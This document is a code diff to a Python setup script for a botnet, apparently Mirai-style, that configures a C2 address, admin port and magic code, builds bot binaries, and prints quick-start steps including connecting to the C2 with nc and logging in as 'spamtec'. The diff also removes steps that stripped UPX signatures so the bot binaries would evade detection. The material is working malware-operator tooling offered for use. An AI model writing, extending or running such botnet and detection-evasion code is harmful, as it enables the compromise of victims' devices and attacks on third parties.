@@ -530,6 +530,36 @@ def save_config(base_path: str, config: dict):
     return config_path
 
 
+def print_summary(config: dict):
+    """Print final setup summary with all configuration details"""
+    print(f"\n{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}")
+    print(f"{Colors.BRIGHT_GREEN}{Colors.BOLD}  ✓ SETUP COMPLETE!{Colors.RESET}")
+    print(f"{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}\n")
+
+    print(
+        f"  {Colors.YELLOW}C2 Address:{Colors.RESET}      {Colors.BRIGHT_WHITE}{config.get('c2_address', 'N/A')}{Colors.RESET}"
+    )
+    print(
+        f"  {Colors.YELLOW}Admin Port:{Colors.RESET}      {Colors.BRIGHT_WHITE}{config.get('admin_port', 'N/A')}{Colors.RESET}"
+    )
+    print(
+        f"  {Colors.YELLOW}Magic Code:{Colors.RESET}      {Colors.BRIGHT_WHITE}{config.get('magic_code', 'N/A')}{Colors.RESET}"
+    )
+    print(
+        f"  {Colors.YELLOW}Protocol:{Colors.RESET}        {Colors.BRIGHT_WHITE}{config.get('protocol_version', 'N/A')}{Colors.RESET}"
+    )
+    print()
+
+    print(f"{Colors.BRIGHT_CYAN}  Quick Start:{Colors.RESET}")
+    print(f"    1. Start CNC:    {Colors.GREEN}cd cnc && ./server{Colors.RESET}")
+    c2_ip = config.get("c2_address", "localhost:443").split(":")[0]
+    admin_port = config.get("admin_port", "420")
+    print(f"    2. Connect:      {Colors.GREEN}nc {c2_ip} {admin_port}{Colors.RESET}")
+    print(f"    3. Login:        {Colors.GREEN}spamtec{Colors.RESET}")
+    print(f"    4. Bot bins:     {Colors.GREEN}bot/bins/{Colors.RESET}")
+    print()
+
+
 def get_current_config(bot_path: str, cnc_path: str) -> dict:
     """Extract current configuration from source files"""
     config = {}
@@ -801,11 +831,6 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
         warning("This will take several minutes...")
         if build_bots(bot_path):
             success("Bot binaries built successfully")
-            # Strip UPX signatures from packed binaries
-            if deupx_binaries(bot_path):
-                success("UPX signatures stripped successfully")
-            else:
-                warning("Failed to strip UPX signatures - binaries may be detectable")
         else:
             warning("Bot build had issues - check bot/bins/ folder")
 
@@ -937,11 +962,6 @@ def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
         warning("This will take several minutes...")
         if build_bots(bot_path):
             success("Bot binaries built successfully")
-            # Strip UPX signatures from packed binaries
-            if deupx_binaries(bot_path):
-                success("UPX signatures stripped successfully")
-            else:
-                warning("Failed to strip UPX signatures - binaries may be detectable")
         else:
             warning("Bot build had issues - check bot/bins/ folder")
 
